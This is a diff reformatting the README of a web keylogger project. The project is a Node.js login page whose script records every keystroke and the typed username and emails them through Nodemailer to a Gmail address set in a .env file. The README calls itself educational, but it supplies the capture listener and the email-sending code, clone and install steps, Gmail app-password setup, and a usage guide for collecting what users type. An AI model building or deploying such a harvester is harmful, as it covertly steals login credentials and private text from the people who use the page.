@@ -1,8 +1,10 @@
-# # Keylogger Project 🕵️‍♂️
+# 🕵️‍♂️ Keylogger Project
 
-A comprehensive educational project demonstrating client-server communication, event handling, and data processing in web applications. This implementation focuses on understanding keystroke capture mechanisms and secure data transmission protocols.
+A comprehensive **educational project** demonstrating **client-server communication, event handling, and data processing** in web applications. This implementation focuses on understanding **keystroke capture mechanisms** and **secure data transmission protocols**.
 
-## System Architecture
+---
+
+## 📌 System Architecture
 
 ```mermaid
 flowchart TD
@@ -10,20 +12,20 @@ flowchart TD
     classDef backend fill:#66BB6A,color:#fff,stroke:#388E3C
     classDef storage fill:#FFA726,color:#000,stroke:#F57C00
     
-    subgraph Frontend["Frontend Layer"]
+    subgraph Frontend[Frontend Layer]
         UI[Login Form]:::frontend
         KS[Keystroke Capture]:::frontend
         FM[Form Manager]:::frontend
     end
     
-    subgraph Backend["Backend Services"]
+    subgraph Backend[Backend Services]
         Server[Express Server]:::backend
         KEYS[Keystroke Processor]:::backend
         Email[Nodemailer Service]:::backend
     end
     
-    subgraph Storage["Configuration"]
-        ENV[".env Configuration"]:::storage
+    subgraph Storage[Configuration]
+        ENV[.env Configuration]:::storage
     end
     
     UI --> KS
@@ -33,28 +35,23 @@ flowchart TD
     KEYS --> Email
     ENV -.-> Server
     
-    %% Legend
-    subgraph Legend["Component Types"]
+    subgraph Legend[Component Types]
         F[Frontend Components]:::frontend
         B[Backend Services]:::backend
         S[Storage/Config]:::storage
     end
 ```
 
+### 🔹 Layers Overview:
+- **🔵 Frontend Layer:** Handles user interaction and keystroke capture
+- **🟢 Backend Services:** Processes captured data and manages email transmission
+- **🟡 Configuration:** Stores environment variables and settings
 
+---
 
+## 📂 Project Structure
 
-The diagram illustrates the system's three-layer architecture:
-
-- 🔵 Frontend Layer: Handles user interaction and keystroke capture
-- 🟢 Backend Services: Processes captured data and manages email transmission
-- 🟡 Configuration: Stores environment variables and settings
-
-The dashed line indicates that the backend server reads configuration values from the .env file during initialization. Each component communicates sequentially, with keystrokes flowing from capture through processing to delivery.
-
-## Project Structure
-
-```text
+```plaintext
 📁 project-root/
 ├── 📄 index.js          # Backend server implementation
 ├── 📄 script.js         # Frontend keystroke capture
@@ -64,7 +61,9 @@ The dashed line indicates that the backend server reads configuration values fro
 └── 📄 .env             # Environment configuration
 ```
 
-## Data Flow Visualization
+---
+
+## 🔄 Data Flow Visualization
 
 ```mermaid
 sequenceDiagram
@@ -96,42 +95,43 @@ sequenceDiagram
     end
 ```
 
+### 🔹 Phases Breakdown:
+1. **🔵 Normal Login Flow** – User interaction and data capture
+2. **🟢 Processing Phase** – Data handling and transmission
+3. **🟡 Error Handling** – Robust fault tolerance mechanisms
 
+---
 
+## 🛠️ Setup Instructions
 
-The sequence diagram shows three key phases of operation:
-
-1. 🔵 Normal Login Flow: Shows the typical user interaction sequence
-2. 🟢 Processing Phase: Illustrates how data is processed and transmitted
-3. 🟡 Error Handling: Demonstrates fault tolerance mechanisms
-
-Solid arrows (→) represent direct actions, while dashed arrows (-->) show responses or callbacks. Alternative flows (marked with 'alt') show how the system handles different error scenarios.
-
-## Setup Instructions 🛠️
-
-Clone the Repository```bash
+### 🔹 Clone the Repository
+```bash
 git clone https://github.com/pranaykumar2/keylogger.git
 ```
 
-Install Dependencies```bash
+### 🔹 Install Dependencies
+```bash
 npm install
 ```
 
-Configure Environment Variables```plaintext
+### 🔹 Configure Environment Variables
+```plaintext
 GMAILFROM=your-from-email@gmail.com
 PASSWORD=your-email-password
 GMAILTO=your-to-email@gmail.com
 PORT=3000
 ```
 
-Initialize Server```bash
+### 🔹 Initialize Server
+```bash
 node index.js
 ```
 
-## Implementation Details 🔍
+---
 
-### Keystroke Capture Mechanism
+## 🔍 Implementation Details
 
+### ✏️ Keystroke Capture Mechanism
 ```javascript
 document.addEventListener('keydown', (event) => {
     const keyInfo = {
@@ -144,8 +144,7 @@ document.addEventListener('keydown', (event) => {
 });
 ```
 
-### Email Transmission System
-
+### 📩 Email Transmission System
 ```javascript
 const transporter = nodemailer.createTransport({
     service: 'gmail',
@@ -159,40 +158,62 @@ const mailOptions = {
     from: process.env.GMAILFROM,
     to: process.env.GMAILTO,
     subject: 'Keystrokes Log',
-    text: `Keystrokes log for user ${username}:\n${keysPressedText}`
+    text: `Keystrokes log for user ${username}:
+${keysPressedText}`
 };
 ```
-## **Steps to setup `APP PASSWORD`:**
 
-   1. Go to your Google Account App Passwords: [Google App Passwords](https://myaccount.google.com/apppasswords)
-   2. Name your app and create the password
-   3. Copy the generated password and use it in the `.env` file
-   4. 
-## Usage Guide 📝
+---
 
-Launch the application at localhost:3000Enter login credentials in the formType any additional text while the page is activeSubmit the form to trigger email transmission## Technologies Used 💻
+## 🔐 Security Considerations
 
-- 🔷 Frontend: HTML/CSS/JavaScript
-- 🔷 Backend: Node.js, Express.js
-- 🔷 Utilities: Nodemailer, Body-parser
-- 🔷 Development: Git
+✅ **Use environment variables** to store sensitive credentials
+✅ **Implement error handling and logging** for robust operations
+✅ **Use secure communication protocols** to prevent data leaks
+✅ **Regularly update dependencies** to prevent vulnerabilities
 
-## Contributing Guidelines 🤝
+---
 
-- Open an issue before submitting major changes
-- Follow the existing code style
-- Include comprehensive test cases
-- Document new features thoroughly
+## 📋 Steps to Setup `APP PASSWORD`
 
-## License 📜
+1. Go to your Google Account **App Passwords**: [Google App Passwords](https://myaccount.google.com/apppasswords)
+2. Name your app and create the password
+3. Copy the generated password and use it in the `.env` file
 
-Released under the MIT License. See LICENSE file for details.
+---
 
-## Security Considerations 🔒
+## 📝 Usage Guide
 
-- Store sensitive credentials securely using environment variables
-- Implement proper error handling and logging
-- Use secure communication protocols
-- Regularly update dependencies to prevent vulnerabilities
+🚀 **Launch the application** at `localhost:3000`
+📌 **Enter login credentials** in the form
+⌨️ **Type any additional text** while the page is active
+📤 **Submit the form** to trigger email transmission
 
-This enhanced README provides a clearer understanding of the system architecture and implementation details while maintaining a professional and educational focus. The added diagrams help visualize both the static structure and dynamic interactions of the system components.
+---
+
+## 💻 Technologies Used
+
+🔷 **Frontend:** HTML, CSS, JavaScript  
+🔷 **Backend:** Node.js, Express.js  
+🔷 **Utilities:** Nodemailer, Body-parser  
+🔷 **Development:** Git
+
+---
+
+## 🤝 Contributing Guidelines
+
+- 📌 **Open an issue** before submitting major changes
+- 📌 **Follow the existing code style** for consistency
+- 📌 **Include comprehensive test cases** when adding features
+- 📌 **Document new features** thoroughly in the README
+
+---
+
+## 📜 License
+
+Released under the **MIT License**. See `LICENSE` file for details.
+
+---
+
+### 🎯 **Enjoy coding and stay secure! 🔐**
+
